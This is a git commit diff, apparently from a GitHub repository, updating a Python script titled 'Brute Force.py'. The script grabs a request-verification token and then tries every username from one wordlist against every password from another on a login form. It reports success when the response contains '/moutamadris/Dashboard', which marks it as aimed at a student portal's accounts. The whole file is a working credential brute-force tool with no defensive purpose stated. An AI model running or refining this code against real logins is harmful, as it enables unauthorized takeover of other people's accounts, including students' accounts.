404b7db1c130306bea5c7d625fb544832d74fd60
Hacking-Wibsite <160402395+Hacking-Wibsite@users.noreply.github.com>
2024-03-27 02:22:52 +1300

    Update Brute Force.py

--- Brute Force.py
+++ Brute Force.py
@@ -1,3 +1,4 @@
+
 import requests
 from bs4 import BeautifulSoup
 
@@ -12,30 +13,30 @@ def get_token(source):
 with requests.Session() as s:
     
     src = s.get(url).text
-    
-    email = input("Eenter Your Email :")
-    
-    password = open(input("Eenter Your Password :")).read().split()
-    
-for P_assword in password :
-    
-    creds = {
-        
-        "username"   : email,
-        
-        "password"   : P_assword.split(),
-        
-        "Login"      : "Submit",
-        
-        "__RequestVerificationToken" : get_token(src),
-        
-        }
-    r = s.post(url, data = creds)
-        
-    if "مساري الدراسي" in r.text :
 
-        print(r.text,"Find Password :",P_assword)
-        
-    else :
-        print(r.text,"Error Password :",P_assword)
+    user1 = open("user1.txt","r").read().split()
 
+    pass2 = open("pass2.txt","r").read().split()
+
+    for user_1 in user1 :
+
+        for pass_2 in pass2 :
+    
+            creds = {
+                            
+                "username" : user_1,
+                            
+                "password" : pass_2,
+                            
+                "login"    : "login",
+
+                "__RequestVerificationToken" : get_token(src),
+                            
+                    }
+            r = s.post(url, data = creds)
+            
+            if "/moutamadris/Dashboard" in r.text :
+                print(user_1,"Find Password :",pass_2)
+            elif "/moutamadris/Dashboard" not in r.text :
+                print(user_1,"Error Password :",pass_2)
+            
